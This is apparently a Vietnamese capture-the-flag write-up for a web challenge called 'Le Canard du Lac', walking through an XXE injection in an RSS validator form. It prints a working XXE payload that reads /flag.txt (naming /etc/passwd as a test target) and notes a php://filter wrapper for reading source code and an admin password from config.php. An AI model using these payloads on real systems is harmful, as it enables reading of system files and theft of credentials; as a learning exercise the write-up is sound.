# Write-up: Le Canard du Lac

**Mảng:** Web
**Lỗ hổng:** XXE (XML External Entity) Injection

### 1. Phân tích (Recon)
*   Website là một trang tin tức, có chức năng **RSS Validator** tại đường dẫn `/rss.php`.
*   Form này cho phép người dùng nhập trực tiếp mã **XML** để server xử lý (parse).
*   Gợi ý "No brute-forcing" cho thấy cần khai thác lỗ hổng logic hoặc injection thay vì đoán mật khẩu.

### 2. Khai thác (Exploit)
*   Thử nghiệm chèn các thực thể XML độc hại (External Entities) để xem server có cho phép đọc file hệ thống hay không.
*   Mục tiêu thường là file `/etc/passwd` (để kiểm tra lỗi) hoặc `/flag.txt` (để lấy cờ).

**Payload cuối cùng:**
Sử dụng payload XXE cơ bản trỏ tới file `file:///flag.txt`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag.txt" >
]>
<rss version="2.0">
  <channel>
    <title>Exploit</title>
    <link>http://example.com</link>
    <description>&xxe;</description>
  </channel>
</rss>
```

### 3. Kết quả
*   Sau khi bấm "Validate Feed", server parse đoạn XML trên, thực thi entity `&xxe;` và trả về nội dung của `/flag.txt` nằm trong thẻ `<description>`.

---
*Note: Ngoài ra có thể dùng wrapper `php://filter/convert.base64-encode/resource=admin.php` để đọc source code, lấy password admin trong `config.php` rồi đăng nhập, nhưng cách đọc thẳng file flag nhanh hơn.*